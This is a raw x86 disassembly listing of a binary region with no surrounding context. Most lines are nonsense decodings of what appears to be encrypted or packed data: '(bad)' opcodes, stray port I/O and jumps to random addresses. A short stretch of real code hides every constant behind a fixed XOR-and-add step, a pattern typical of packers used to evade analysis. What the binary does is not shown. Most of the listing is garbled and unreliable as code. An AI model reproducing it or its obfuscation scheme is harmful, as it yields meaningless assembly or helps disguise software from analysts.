  426286:	out    0xe2,al
  426288:	(bad)  
  426289:	fidivr DWORD PTR [edx-0x2c141230]
  42628f:	fcmovu st,st(7)
  426291:	add    eax,edx
  426293:	cmc    
  426294:	cli    
  426295:	loopne 0x42629b
  426297:	int3   
  426298:	(bad)  
  426299:	loopne 0x42627b
  42629b:	jmp    0xec083878
  4262a0:	fld    QWORD PTR [eax]
  4262a2:	in     al,dx
  4262a3:	call   0xc82a3150
  4262a8:	mov    ebx,0xe5aef9f6
  4262ad:	int3   
  4262ae:	enter  0xf9b4,0xf3
  4262b2:	aad    0xfd
  4262b4:	int3   
  4262b5:	repnz std 
  4262b7:	pop    es
  4262b8:	ret    
  4262b9:	add    bh,ah
  4262bb:	shl    edi,0xde
  4262be:	pop    es
  4262bf:	loop   0x42629e
  4262c1:	(bad)  
  4262c2:	call   0xb6ff2694
  4262c7:	lods   al,BYTE PTR ds:[esi]
  4262c8:	jmp    0xcbf6:0xd6cdb3f2
  4262cf:	repnz mov edi,0xcedbc1f0
  4262d5:	clc    
  4262d6:	fcompp 
  4262d8:	cld    
  4262d9:	jmp    0x4262bd
  4262db:	out    dx,eax
  4262dc:	in     al,0xee
  4262de:	std    
  4262df:	into   
  4262e0:	fadd   DWORD PTR [edx+edx*8]
  4262e3:	fcomp  st(5)
  4262e5:	call   0xd2f723ca
  4262ea:	rcl    dh,cl
  4262ec:	leave  
  4262ed:	lods   al,BYTE PTR ds:[esi]
  4262ee:	fdiv   st(5),st
  4262f0:	xlat   BYTE PTR ds:[ebx]
  4262f1:	cmc    
  4262f2:	cmc    
  4262f3:	fild   DWORD PTR [esi]
  4262f5:	loop   0x4262ef
  4262f7:	(bad)  
  4262f8:	fdivrp st(0),st
  4262fa:	les    eax,FWORD PTR [edi]
  4262fc:	std    
  4262fd:	(bad)  
  4262ff:	jmp    0xc02c3dff
  426304:	retf   
  426305:	in     eax,dx
  426306:	retf   0xece7
  426309:	repnz aam 0xd0
  42630c:	leave  
  42630d:	(bad)  
  42630e:	call   esi
  426310:	cmc    
  426311:	shr    ch,cl
  426313:	shl    cl,1
  426315:	clc    
  426316:	add    ah,dh
  426318:	hlt    
  426319:	fimul  WORD PTR [edx]
  42631b:	jmp    0x4262fb
  42631d:	jmp    0xda512f1f
  426322:	into   
  426323:	fsubr  st(5),st
  426325:	loope  0x4262ea
  426327:	call   0xd1191efb
  42632c:	(bad)  
  42632d:	aad    0xb8
  42632f:	fsubp  st(7),st
  426331:	cmc    
  426332:	aam    0xcf
  426334:	int3   
  426335:	add    eax,0xeaffd4bf
  42633a:	rcr    esp,0x1
  42633d:	push   es
  42633e:	cli    
  42633f:	int    0x1
  426341:	adc    edx,ecx
  426343:	(bad)  
  426344:	mov    cl,0xb0
  426346:	leave  
  426347:	ret    
  426348:	xlat   BYTE PTR ds:[ebx]
  426349:	vpsllw xmm5,xmm3,xmm2
  42634d:	(bad)  
  42634f:	in     al,dx
  426350:	mov    ebp,0xe3dee8f6
  426355:	rcr    dh,0xbc
  426358:	sti    
  426359:	retf   0xc1fd
  42635c:	iret   
  42635d:	(bad)  
  42635e:	fiadd  WORD PTR [eax]
  426360:	shl    ecx,0xd1
  426363:	loop   0x426315
  426365:	loope  0x42634d
  426367:	retf   
  426368:	repnz mov dh,0xb1
  42636b:	mov    eax,0xdffaefb0
  426370:	rcr    bl,cl
  426372:	(bad)  
  426373:	add    eax,esi
  426375:	(bad)  
  426377:	ftst   
  426379:	icebp  
  42637a:	mov    eax,0xd8fcc0e5
  426380:	jmp    0x426389
  426382:	mov    bl,0xe1
  426384:	out    0xc0,al
  426386:	int    0xe3
  426388:	shl    BYTE PTR [ebx-0x202b1b06],1
  42638e:	(bad)  
  426390:	repnz into 
  426392:	fcmovnb st,st(1)
  426394:	cld    
  426395:	mov    eax,0xd7fcc5da
  42639a:	(bad)  
  42639b:	psrad  mm7,mm2
  42639e:	enter  0xbca,0xe5
  4263a2:	stos   DWORD PTR es:[edi],eax
  4263a3:	out    0xe1,al
  4263a5:	scas   al,BYTE PTR es:[edi]
  4263a6:	icebp  
  4263a7:	out    dx,eax
  4263a8:	shl    ecx,0xd8
  4263ab:	shl    bh,cl
  4263ad:	imul   bh
  4263af:	div    dh
  4263b1:	mov    edi,0xdae6d7e8
  4263b6:	(bad)  
  4263b8:	cmc    
  4263b9:	call   eax
  4263bb:	cmc    
  4263bc:	leave  
  4263bd:	pop    es
  4263be:	out    dx,al
  4263bf:	ret    0xdf06
  4263c2:	scas   al,BYTE PTR es:[edi]
  4263c3:	retf   
  4263c4:	call   0xf5254698
  4263c9:	mov    cl,0xb1
  4263cb:	in     al,dx
  4263cc:	out    0xec,al
  4263ce:	out    dx,eax
  4263cf:	aam    0xc8
  4263d1:	ret    
  4263d2:	sar    esi,0xef
  4263d5:	add    ebx,ebp
  4263d7:	add    al,0xd1
  4263d9:	mov    DWORD PTR ds:0xc3ce07e9,0xcceb0d0c
  4263e3:	ret    
  4263e4:	ret    0xc3cf
  4263e7:	loop   0x4263d5
  4263e9:	lock loope 0x4263bc
  4263ec:	jmp    0xedd0:0xf5f3ccd1
  4263f3:	stc    
  4263f4:	(bad)  
  4263f6:	fsubrp st(2),st
  4263f8:	out    0xfe,eax
  4263fa:	jmp    0xe35247cf
  4263ff:	(bad)  
  426400:	repnz out 0xdc,al
  426403:	int    0xa8
  426405:	mov    bh,0xe6
  426407:	leave  
  426408:	(bad)  
  426409:	int    0xe1
  42640b:	cli    
  42640c:	retf   
  42640d:	sti    
  42640e:	int3   
  42640f:	mov    edi,0xdec1dbd4
  426414:	repnz repz in al,dx
  426417:	loop   0x42641a
  426419:	fadd   DWORD PTR ds:0xc30adbc9
  42641f:	hlt    
  426420:	clc    
  426421:	iret   
  426422:	mov    ecx,0xabe0e9bc
  426427:	in     al,0xc0
  426429:	jmp    0xf6b3:0xf3eaceef
  426430:	jmp    0xee065606
  426435:	int3   
  426436:	add    ah,al
  426438:	(bad)  
  426439:	(bad)  
  42643b:	sti    
  42643c:	(bad)  
  42643d:	jmp    edx
  42643f:	add    edi,ebp
  426441:	push   cs
  426442:	fldpi  
  426444:	mov    esi,0xe6cbd5e6
  426449:	in     eax,0xe1
  42644b:	(bad)  
  42644c:	shl    bl,cl
  42644e:	lock out dx,eax
  426450:	mov    cl,0x1
  426452:	std    
  426453:	shl    ebp,cl
  426455:	add    ch,bh
  426457:	add    esp,edi
  426459:	cli    
  42645a:	(bad)  
  42645b:	jmp    eax
  42645d:	or     ebx,eax
  42645f:	fist   WORD PTR [edx]
  426461:	adc    DWORD PTR [ecx-0x331b4135],ebp
  426467:	cmc    
  426468:	jmp    0xfb124615
  42646d:	repz fidivr DWORD PTR [ebp+ebx*8-0x19280816]
  426475:	(bad)  
  426477:	pop    es
  426478:	add    eax,0xc5f8e507
  42647d:	jecxz  0x42645e
  42647f:	call   0xf007716e
  426484:	loopne 0x426468
  426486:	int    0xf2
  426488:	jmp    0xc8df:0xecccc6f3
  42648f:	in     al,0xbf
  426491:	mov    ebp,0xe2b5ded0
  426496:	mov    edi,0x2d0bf9f8
  42649b:	sti    
  42649c:	jb     0x4264d0
  42649e:	add    BYTE PTR ds:0x75108b5,dh
  4264a4:	cmp    eax,0xf89ca5b0
  4264a9:	je     0x42b03e
  4264af:	mov    eax,DWORD PTR [ebp-0x8]
  4264b2:	add    eax,DWORD PTR [ebp-0x80]
  4264b5:	mov    DWORD PTR [ebp-0x84],eax
  4264bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4264be:	sub    eax,DWORD PTR [ebp-0x80]
  4264c1:	mov    DWORD PTR [ebp-0x88],eax
  4264c7:	mov    eax,DWORD PTR [ebp-0x88]
  4264cd:	mov    DWORD PTR [ebp-0x19c],eax
  4264d3:	mov    eax,DWORD PTR [ebp-0x84]
  4264d9:	mov    DWORD PTR [ebp-0x198],eax
  4264df:	mov    DWORD PTR [ebp-0x150],0xf89c85b0
  4264e9:	mov    DWORD PTR [ebp-0x154],0xf89c85b3
  4264f3:	mov    eax,DWORD PTR [ebp-0x150]
  4264f9:	xor    eax,0x75108b5
  4264fe:	add    eax,0x3272fb
  426503:	mov    DWORD PTR [ebp-0x144],eax
  426509:	mov    eax,DWORD PTR [ebp-0x150]
  42650f:	xor    eax,0x75108b5
  426514:	add    eax,0x3272fb
  426519:	mov    DWORD PTR [ebp-0x148],eax
  42651f:	mov    DWORD PTR [ebp-0x14c],0xf89c8590
  426529:	mov    DWORD PTR [ebp-0x158],0xf89c85b9
  426533:	mov    eax,DWORD PTR [ebp-0x19c]
  426539:	mov    ecx,DWORD PTR [ebp-0x150]
  42653f:	xor    ecx,0x75108b5
  426545:	add    ecx,0x3272fb
  42654b:	cmp    eax,ecx
  42654d:	je     0x42b039
  426553:	mov    eax,DWORD PTR [ebp-0x154]
  426559:	xor    eax,0x75108b5
  42655e:	add    eax,0x3272fb
  426563:	mov    ecx,DWORD PTR [ebp-0x144]
  426569:	imul   ecx,eax
  42656c:	mov    eax,DWORD PTR [ebp-0x154]
  426572:	xor    eax,0x75108b5
  426577:	add    eax,0x3272fb
  42657c:	mov    edx,DWORD PTR [ebp-0x19c]
  426582:	sub    edx,eax
  426584:	cmp    ecx,edx
  426586:	ja     0x42b039
  42658c:	mov    eax,DWORD PTR [ebp-0x19c]
  426592:	mov    ecx,DWORD PTR [ebp-0x144]
  426598:	sub    eax,ecx
  42659a:	mov    ecx,DWORD PTR [ebp-0x14c]
  4265a0:	xor    ecx,0x75108b5
  4265a6:	add    ecx,0x3272fb
  4265ac:	xor    edx,edx
  4265ae:	div    ecx
  4265b0:	mov    DWORD PTR [ebp-0x15c],eax
  4265b6:	mov    eax,DWORD PTR [ebp-0x15c]
  4265bc:	mov    ecx,DWORD PTR [ebp-0x158]
  4265c2:	xor    ecx,0x75108b5
  4265c8:	add    ecx,0x3272fb
  4265ce:	cmp    eax,ecx
  4265d0:	jbe    0x4265ec
  4265d6:	mov    eax,DWORD PTR [ebp-0x158]
  4265dc:	xor    eax,0x75108b5
  4265e1:	add    eax,0x3272fb
  4265e6:	mov    DWORD PTR [ebp-0x15c],eax
  4265ec:	mov    eax,DWORD PTR [ebp-0x14c]
  4265f2:	xor    eax,0x75108b5
  4265f7:	add    eax,0x3272fb
  4265fc:	mov    ecx,DWORD PTR [ebp-0x15c]
  426602:	imul   ecx,eax
  426605:	mov    DWORD PTR [ebp-0x148],ecx
  42660b:	mov    eax,DWORD PTR [ebp-0x148]
  426611:	mov    ecx,DWORD PTR [ebp-0x150]
  426617:	xor    ecx,0x75108b5
  42661d:	add    ecx,0x3272fb
  426623:	cmp    eax,ecx
  426625:	je     0x428c70
  42662b:	mov    eax,DWORD PTR [ebp-0x148]
  426631:	mov    DWORD PTR [ebp-0x194],eax
  426637:	mov    eax,DWORD PTR [ebp-0x198]
  42663d:	add    eax,DWORD PTR [ebp-0x144]
  426643:	mov    DWORD PTR [ebp-0x190],eax
  426649:	mov    DWORD PTR [ebp-0x17c],0xf89c85b0
  426653:	mov    DWORD PTR [ebp-0x184],0xf89c85b3
  42665d:	mov    DWORD PTR [ebp-0x170],0xf89c85b2
  426667:	mov    DWORD PTR [ebp-0x16c],0xf89c85bd
  426671:	mov    DWORD PTR [ebp-0x168],0xf89c85b3
  42667b:	mov    eax,DWORD PTR [ebp-0x17c]
  426681:	xor    eax,0x75108b5
  426686:	add    eax,0x3272fb
  42668b:	jmp    0x428a31
  426690:	ffreep st(2)
  426692:	sub    esi,DWORD PTR [esi+esi*1+0x3dd06474]
  426699:	xor    eax,0xb2aa5692
  42669e:	mov    ecx,0x798973bf
  4266a3:	jnp    0x4266a7
  4266a5:	cwde   
  4266a6:	jnp    0x426723
  4266a8:	out    0xf5,eax
  4266aa:	loopne 0x426676
  4266ac:	iret   
  4266ad:	call   0xdfef3fa0
  4266b2:	mov    ebp,0xc6aed0ca
  4266b7:	repz fcomi st,st(0)
  4266ba:	in     eax,0xec
  4266bc:	aad    0xfd
  4266be:	mov    ebp,0xf9d1d5bf
  4266c3:	add    esp,esi
  4266c5:	clc    
  4266c6:	rcl    ah,0xe5
  4266c9:	fcmovu st,st(5)
  4266cb:	in     eax,dx
  4266cc:	aad    0xcf
  4266ce:	call   0xc22b19a5
  4266d3:	ror    edx,1
  4266d5:	vshufps ymm2,ymm3,ymm5,0xeb
  4266da:	fstp   TBYTE PTR [ebx-0x54a4915]
  4266e0:	fstp   TBYTE PTR [ecx-0x223e3226]
  4266e6:	std    
  4266e7:	icebp  
  4266e8:	or     esi,edx
  4266ea:	add    eax,0x9f3f800
  4266ef:	retf   0xc4b9
  4266f2:	in     eax,0xe3
  4266f4:	fsubr  st(7),st
  4266f6:	fcmovb st,st(1)
  4266f8:	rcl    eax,1
  4266fa:	sar    ch,cl
  4266fc:	mov    esi,0xd5d3b8d9
  426701:	loopne 0x4266fb
  426703:	(bad)  
  426705:	rcr    dl,cl
  426707:	ret    
  426708:	retf   0xd8c0
  42670b:	retf   
  42670c:	aam    0xf9
  42670e:	rcl    ebx,cl
  426710:	in     al,0xc2
  426712:	loopne 0x4266fa
  426714:	in     al,0xec
  426716:	mov    dl,0xf4
  426718:	mov    ah,0xda
  42671a:	iret   
  42671b:	jmp    0x4266f0
  42671d:	fcmovne st,st(1)
  42671f:	test   BYTE PTR [ebx],0xbe
  426722:	ret    
  426723:	cld    
  426724:	xlat   BYTE PTR ds:[ebx]
  426725:	shl    edi,0xde
  426728:	sar    eax,0xe0
  42672b:	into   
  42672c:	loopne 0x426721
  42672e:	enter  0xafff,0xd2
  426732:	rcl    dh,1
  426734:	loopne 0x42672c
  426736:	loope  0x426705
  426738:	sar    edi,1
  42673a:	fsubp  st(1),st
  42673c:	in     eax,dx
  42673d:	(bad)  
  42673f:	mov    esp,0xedf6bdd1
  426744:	mul    esi
  426746:	mov    ch,0xc5
  426749:	out    dx,eax
  42674a:	std    
  42674b:	(bad)  
  42674c:	jmp    0xe11f6516
  426751:	lods   eax,DWORD PTR ds:[esi]
  426752:	icebp  
  426753:	lock ret 
  426755:	hlt    
  426756:	in     al,dx
  426757:	aam    0xef
  426759:	fyl2xp1 
  42675b:	sar    esp,1
  42675d:	les    edi,FWORD PTR [edi-0xc250e02]
  426763:	cli    
  426764:	fdivr  st(3),st
  426766:	rol    edx,1
  426768:	in     eax,0x8
  42676a:	rol    al,0xfb
  42676d:	loopne 0x426771
  42676f:	cli    
  426770:	mov    ebp,0xe8bdeff7
  426775:	sti    
  426776:	lods   eax,DWORD PTR ds:[esi]
  426777:	jmp    0x426759
  426779:	aam    0xf3
  42677b:	(bad)  
  42677c:	fucomip st,st(0)
  42677e:	stc    
  42677f:	mov    eax,0xc7c3f9cd
  426784:	in     al,0xd8
  426786:	aad    0xd1
  426788:	add    eax,0xce6fde3
  42678d:	in     eax,0xfb
  42678f:	add    ebx,esi
  426791:	in     al,dx
  426792:	ror    ebx,cl
  426794:	loopne 0x42678c
  426796:	(bad)
  42679a:	in     eax,dx
  42679b:	imul   esi
  42679d:	std    
  42679e:	retf   0xeddf
  4267a1:	rcl    ah,1
  4267a3:	loopne 0x42677b
  4267a5:	mov    esi,0xca0604e4
  4267aa:	add    al,0xd5
  4267ac:	retf   0x9fb
  4267af:	jmp    0xe43a297e
  4267b4:	into   
  4267b5:	mov    ch,0xca
  4267b7:	shr    ebp,cl
  4267b9:	shl    dl,cl
  4267bb:	mov    al,0xcd
  4267bd:	stc    
  4267be:	std    
  4267bf:	fcmovne st,st(1)
  4267c1:	(bad)  
  4267c2:	mov    ebp,0x6d7feed
  4267c7:	add    BYTE PTR [edx],cl
  4267c9:	jmp    esp
  4267cb:	into   
  4267cc:	iret   
  4267cd:	(bad)  
  4267cf:	add    ecx,esi
  4267d1:	int3   
  4267d2:	out    dx,al
  4267d3:	leave  
  4267d4:	mov    ch,0xe4
  4267d6:	aad    0xd2
  4267d8:	clc    
  4267d9:	(bad)
  4267dc:	repnz in al,0xea
  4267df:	mov    esp,0xc107d0c9
  4267e4:	sar    DWORD PTR [edx+0x408e5c6],0xf9
  4267eb:	jecxz  0x4267f7
  4267ed:	add    eax,esp
  4267ef:	pop    es
  4267f0:	loopne 0x4267d5
  4267f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267f3:	int3   
  4267f4:	shl    DWORD PTR [eax-0x82e3440],1
  4267fa:	fcmovnb st,st(5)
  4267fc:	(bad)  
  4267fd:	(bad)  
  4267ff:	sar    BYTE PTR [edx+esi*8-0x7fd4020],1
  426806:	fiadd  DWORD PTR [ebx]
  426808:	add    al,0x8
  42680a:	fcmovnbe st,st(6)
  42680c:	or     edx,ebx
  42680e:	add    ah,dh
  426810:	ffreep st(1)
  426812:	rcl    bl,cl
  426814:	shr    bl,cl
  426816:	cli    
  426817:	(bad)  
  426818:	icebp  
  426819:	(bad)  
  42681a:	mov    ch,0xef
  42681c:	(bad)
  42681f:	mov    ah,0xf1
  426821:	(bad)  
  426823:	(bad)  
  426824:	mov    esi,0xe1da02c4
  426829:	(bad)  
  42682a:	or     esi,edx
  42682c:	fmul   DWORD PTR [ecx+ecx*1]
  42682f:	int3   
  426830:	enter  0xd7e4,0xcb
  426834:	out    dx,al
  426835:	not    ebp
  426837:	iret   
  426838:	iret   
  426839:	mov    ecx,0xddf3cefe
  42683e:	in     eax,dx
  42683f:	mov    eax,0xe6ded4e1
  426844:	add    BYTE PTR [edx-0x1f29fa08],bh
  42684a:	iret   
  42684b:	push   cs
  42684c:	std    
  42684d:	add    al,0xda
  42684f:	push   es
  426850:	lods   eax,DWORD PTR ds:[esi]
  426851:	mov    al,0xec
  426853:	ror    esp,0xd7
  426856:	neg    ebx
  426858:	out    0xc8,eax
  42685a:	jmp    0xb214420b
  42685f:	mov    esi,0xfbd3b803
  426864:	mov    edi,0x902fbd2
  426869:	jecxz  0x426871
  42686b:	inc    BYTE PTR [ebx]
  42686d:	int3   
  42686e:	(bad)  
  426870:	in     al,dx
  426871:	out    0xc2,al
  426873:	mov    ebp,0xb7cfd0e4
  426878:	jmp    0xeb2c4075
  42687d:	add    ecx,ebx
  42687f:	in     al,dx
  426880:	fcmovnbe st,st(3)
  426882:	ret    0xdfec
  426885:	int3   
  426886:	lock or ebx,eax
  426889:	cld    
  42688a:	xlat   BYTE PTR ds:[ebx]
  42688b:	aad    0xec
  42688d:	fcmove st,st(3)
  42688f:	loop   0x42687c
  426891:	retf   0xd7df
  426894:	jmp    0xc6ed:0xead9e5c7
  42689b:	(bad)  
  42689c:	enter  0xb1fd,0xe3
  4268a0:	fdivr  st,st(4)
  4268a2:	mov    ch,0xc2
  4268a4:	fnstsw WORD PTR [edx+0x90afbc5]
  4268aa:	push   es
  4268ab:	jecxz  0x4268b3
  4268ad:	(bad)  
  4268ae:	clc    
  4268af:	or     ch,BYTE PTR [ebp-0x35103e5a]
  4268b5:	(bad)  
  4268b6:	into   
  4268b7:	shl    BYTE PTR [edi-0x2a0b0e27],0xeb
  4268be:	call   0xf2053ac5
  4268c3:	sti    
  4268c4:	add    edi,edx
  4268c6:	(bad)  
  4268c8:	fadd   DWORD PTR [ebx]
  4268ca:	cli    
  4268cb:	(bad)  
  4268cd:	dec    edi
  4268cf:	or     cl,dl
  4268d1:	stos   BYTE PTR es:[edi],al
  4268d2:	test   al,0xe8
  4268d4:	(bad)  
  4268d6:	in     eax,0xcb
  4268d8:	(bad)  
  4268d9:	repnz clc 
  4268db:	in     eax,0xbd
  4268dd:	add    ecx,ebp
  4268df:	add    cl,dh
  4268e1:	fiadd  WORD PTR [esi]
  4268e3:	fmulp  st(4),st
  4268e5:	shl    al,0xb
  4268e8:	(bad)  
  4268e9:	jmp    0xf04:0xe8edeef7
  4268f0:	scas   al,BYTE PTR es:[edi]
  4268f1:	iret   
  4268f2:	loopne 0x4268a5
  4268f4:	enter  0xa9c7,0xb3
  4268f8:	mov    bl,0xb8
  4268fa:	fsubp  st(0),st
  4268fc:	std    
  4268fd:	mov    ecx,0xffbcf9df
  426902:	mov    esi,0xac2ec06
  426907:	jmp    0xd06:0xc7ee02dd
  42690e:	std    
  42690f:	cld    
  426910:	in     al,dx
  426911:	sar    DWORD PTR [edi-0xa330e1c],1
  426917:	imul   DWORD PTR [edi-0xc400a48]
  42691d:	icebp  
  42691e:	fsubp  st(4),st
  426920:	rol    DWORD PTR [edi],0xc1
  426923:	fstp   TBYTE PTR [ebx-0x34fb1df9]
  426929:	out    dx,eax
  42692a:	xadd   ah,bh
  42692d:	(bad)
  426930:	shl    bl,1
  426932:	ret    
  426933:	enter  0xe3c6,0xf7
  426937:	mov    ch,0xd5
  426939:	shr    ch,cl
  42693b:	lods   al,BYTE PTR ds:[esi]
  42693c:	enter  0x3be,0xb0
  426940:	fucomip st,st(0)
  426942:	push   es
  426943:	in     al,dx
  426944:	int    0xdb
  426946:	ret    0x9f0
  426949:	fdivr  st(7),st
  42694b:	loop   0x426949
  42694d:	fdivp  st(3),st
  42694f:	in     eax,0xc8
  426951:	out    0xd0,al
  426953:	div    BYTE PTR [ebx-0x2c3d0e38]
  426959:	cmc    
  42695a:	shl    BYTE PTR [eax-0x2e43292f],cl
  426960:	add    al,bh
  426962:	mov    ecx,0xd6bec7ec
  426967:	repnz shl ecx,0x0
  42696b:	or     eax,0x4cef80c
  426970:	(bad)  
  426972:	jmp    0xcfed:0xcfaceae6
  426979:	(bad)  
  42697b:	fidiv  WORD PTR [esi-0x1629292a]
  426981:	(bad)  
  426982:	repz xabort 0xde
  426986:	mov    ebp,0xfb00f9b8
  42698b:	cmc    
  42698c:	add    al,0xda
  42698e:	push   es
  42698f:	(bad)  
  426991:	shl    DWORD PTR [ebp-0x5219114a],cl
  426997:	sti    
  426998:	mov    dl,0xc9
  42699a:	(bad)  
  42699b:	leave  
  42699c:	mov    bl,0xee
  42699e:	fiadd  WORD PTR [ecx]
  4269a0:	int3   
  4269a1:	into   
  4269a2:	icebp  
  4269a3:	clc    
  4269a4:	sar    BYTE PTR [esi-0x2901241c],1
  4269aa:	(bad)  
  4269ab:	out    dx,eax
  4269ac:	out    0xc6,al
  4269ae:	clc    
  4269af:	jmp    0x426981
  4269b1:	lock in al,0xbc
  4269b4:	repnz in eax,0xc7
  4269b7:	mov    dh,0xcc
  4269b9:	(bad)  
  4269ba:	sti    
  4269bb:	call   esp
  4269bd:	jecxz  0x42698c
  4269bf:	int    0xe9
  4269c1:	rcr    ch,cl
  4269c3:	mov    ebp,0xf8f4ecd0
  4269c8:	leave  
  4269c9:	cld    
  4269ca:	or     eax,ebp
  4269cc:	ret    
  4269cd:	out    dx,eax
  4269ce:	out    dx,eax
  4269cf:	cli    
  4269d0:	(bad)  
  4269d1:	shr    BYTE PTR [ecx-0x32533a23],1
  4269d7:	leave  
  4269d8:	repz mov ch,0xf4
  4269db:	in     al,dx
  4269dc:	sti    
  4269dd:	mov    ah,0xea
  4269df:	lock out dx,al
  4269e1:	ret    
  4269e2:	int    0xfd
  4269e4:	mov    esp,0xffe9f9c1
  4269e9:	enter  0xe2e2,0xfe
  4269ed:	retf   
  4269ee:	(bad)  
  4269f0:	jmp    0x4269d1
  4269f2:	int3   
  4269f3:	jecxz  0x4269bc
  4269f5:	ror    ah,1
  4269f7:	jmp    0xc5f336e8
  4269fc:	idiv   BYTE PTR [ecx-0x10452829]
  426a02:	(bad)  
  426a04:	fcom   st(3)
  426a06:	shl    bh,0xe8
  426a09:	loopne 0x4269f4
  426a0b:	in     al,0xd9
  426a0d:	loopne 0x426a16
  426a0f:	(bad)  
  426a10:	mov    esp,0xd1dcd3e9
  426a15:	in     eax,dx
  426a16:	shr    al,1
  426a18:	(bad)  
  426a1a:	leave  
  426a1b:	out    0xbb,al
  426a1d:	out    dx,eax
  426a1e:	rcr    bh,cl
  426a20:	cli    
  426a21:	int    0xe3
  426a23:	int    0xe0
  426a25:	sar    bh,0xea
  426a28:	mov    edi,0xf9c8d401
  426a2d:	fisttp WORD PTR [ebx]
  426a2f:	or     DWORD PTR [ecx+eax*8-0x2d130d42],ebp
  426a36:	test   eax,0xcef9d5b0
  426a3b:	(bad)  
  426a3c:	in     eax,dx
  426a3d:	mov    ah,0x2
  426a3f:	(bad)  
  426a40:	ffreep st(3)
  426a42:	ret    
  426a43:	int3   
  426a44:	repz cld 
  426a46:	(bad)  
  426a48:	icebp  
  426a49:	add    eax,0x30d01f5
  426a4e:	fucomi st,st(7)
  426a50:	loop   0x426a45
  426a52:	out    0xb0,al
  426a54:	out    dx,al
  426a55:	mov    bl,0xb4
  426a57:	int    0xc5
  426a59:	(bad)  
  426a5a:	retf   0xd8c6
  426a5d:	out    dx,al
  426a5e:	mov    ebp,0xd2f3bf03
  426a63:	mov    edi,0xe6c0d604
  426a68:	in     eax,0xe5
  426a6a:	loopne 0x426a33
  426a6c:	loop   0x426a69
  426a6e:	jmp    0xc8ad:0xa8b2f0d9
  426a75:	mov    dh,0xf3
  426a77:	(bad)  
  426a78:	mov    bl,0xb2
  426a7a:	in     eax,dx
  426a7b:	in     eax,dx
  426a7c:	mov    ch,0xd6
  426a7e:	mov    ecx,0xd3dff5de
  426a83:	add    eax,0xbcc7f3dd
  426a88:	(bad)  
  426a8b:	fisttp DWORD PTR [edi]
  426a8d:	adc    edi,eax
  426a8f:	fldenv [edi-0x1d512109]
  426a95:	(bad)  
  426a96:	bnd ret 0xcde7
  426a9a:	retf   
  426a9b:	fdivr  st,st(6)
  426a9d:	cld    
  426a9e:	xlat   BYTE PTR ds:[ebx]
  426a9f:	(bad)  
  426aa0:	mul    edx
  426aa2:	icebp  
  426aa3:	fxch   st(4)
  426aa5:	hlt    
  426aa6:	imul   ecx
  426aa8:	clc    
  426aa9:	in     al,0xcf
  426aab:	add    ch,cl
  426aad:	(bad)  
  426aaf:	add    dl,dl
  426ab1:	loopne 0x426a96
  426ab3:	scas   eax,DWORD PTR es:[edi]
  426ab4:	retf   0xf0d5
  426ab7:	loop   0x426aad
  426ab9:	int    0xf8
  426abb:	in     al,0xd1
  426abd:	enter  0xdbe8,0xd1
  426ac1:	(bad)  
  426ac2:	cli    
  426ac3:	(bad)  
  426ac4:	inc    eax
  426ac6:	sti    
  426ac7:	sti    
  426ac8:	aam    0x0
  426aca:	push   es
  426acb:	(bad)  
  426acc:	clc    
  426acd:	into   
  426ace:	pop    es
  426acf:	push   es
  426ad0:	retf   0xc9c2
  426ad3:	lods   eax,DWORD PTR ds:[esi]
  426ad4:	call   0xf3294dab
  426ad9:	(bad)  
  426ada:	not    edx
  426adc:	(bad)  
  426add:	clc    
  426ade:	mov    ecx,0xc7e3edfe
  426ae3:	mov    ebp,0xdfd8f705
  426ae8:	pop    es
  426ae9:	loope  0x426ae9
  426aeb:	add    cl,BYTE PTR [ebx]
  426aed:	std    
  426aee:	fsub   st,st(7)
  426af0:	in     al,0xcc
  426af2:	shr    al,cl
  426af4:	retf   
  426af5:	shl    ch,0xc9
  426af8:	rcl    esi,cl
  426afa:	aam    0xfa
  426afc:	imul   edi
  426afe:	into   
  426aff:	loop   0x426ad9
  426b01:	sar    DWORD PTR [ecx+eiz*8-0x3d05063b],1
  426b08:	inc    BYTE PTR ds:0xf9e0dd0a
  426b0e:	jmp    0x426b09
  426b10:	in     al,0xf2
  426b12:	faddp  st(7),st
  426b14:	repnz (bad) 
  426b16:	fucompp 
  426b18:	aam    0xf3
  426b1a:	out    0xdf,eax
  426b1c:	mov    eax,0x1cfcad6
  426b21:	out    dx,al
  426b22:	add    dh,ch
  426b24:	add    ebp,eax
  426b26:	xlat   BYTE PTR ds:[ebx]
  426b27:	retf   
  426b28:	in     al,0xc7
  426b2a:	xlat   BYTE PTR ds:[ebx]
  426b2b:	leave  
  426b2c:	or     al,BYTE PTR [eax+eiz*8]
  426b2f:	call   0xca2d2bff
  426b34:	mov    dl,0xcc
  426b36:	out    dx,al
  426b37:	retf   0xb2cd
  426b3a:	mov    edi,0xf0cbf4d8
  426b3f:	in     al,dx
  426b40:	out    dx,al
  426b41:	hlt    
  426b42:	(bad)  
  426b43:	inc    BYTE PTR ds:0xcaead704
  426b49:	idiv   cl
  426b4b:	or     eax,0xdf0106c4
  426b50:	(bad)  [ecx-0x130e5141]
  426b56:	ret    0xd0f7
  426b59:	mov    ecx,0xfffefec8
  426b5e:	lock int 0xde
  426b61:	div    dh
  426b63:	(bad)  
  426b65:	add    bl,bl
  426b67:	add    eax,0xeedbd0e4
  426b6c:	in     al,dx
  426b6d:	in     al,dx
  426b6e:	into   
  426b6f:	(bad)  
  426b71:	mov    esi,0xc5efb7e2
  426b76:	int3   
  426b77:	aam    0xb1
  426b79:	iret   
  426b7a:	lock (bad) 
  426b7d:	mov    esi,0xf9ded2fc
  426b82:	out    dx,al
  426b83:	in     eax,0xdd
  426b85:	in     eax,0xc5
  426b87:	(bad)  
  426b88:	call   0xe218366e
  426b8d:	add    edx,DWORD PTR [ebx]
  426b8f:	retf   
  426b90:	mov    esi,0xafb6bcc1
  426b95:	in     al,dx
  426b96:	repz mov cl,0xe1
  426b99:	cli    
  426b9a:	into   
  426b9b:	lock out dx,al
  426b9d:	mov    ebp,0xdcdfeadd
  426ba2:	cmc    
  426ba3:	add    edi,ebx
  426ba5:	add    edi,DWORD PTR [ecx-0x2919012a]
  426bab:	in     al,0x0
  426bad:	in     eax,dx
  426bae:	dec    BYTE PTR [edi]
  426bb0:	fsubr  DWORD PTR [ebp-0x4f234e5b]
  426bb6:	(bad)  
  426bb7:	hlt    
  426bb8:	mov    ecx,0xbee5caea
  426bbd:	iret   
  426bbe:	lock in eax,dx
  426bc0:	mov    esp,0xf6c3c2ed
  426bc5:	test   BYTE PTR [edx],0x0
  426bc8:	(bad)  
  426bc9:	call   0xd17479d
  426bce:	jmp    0x426bb4
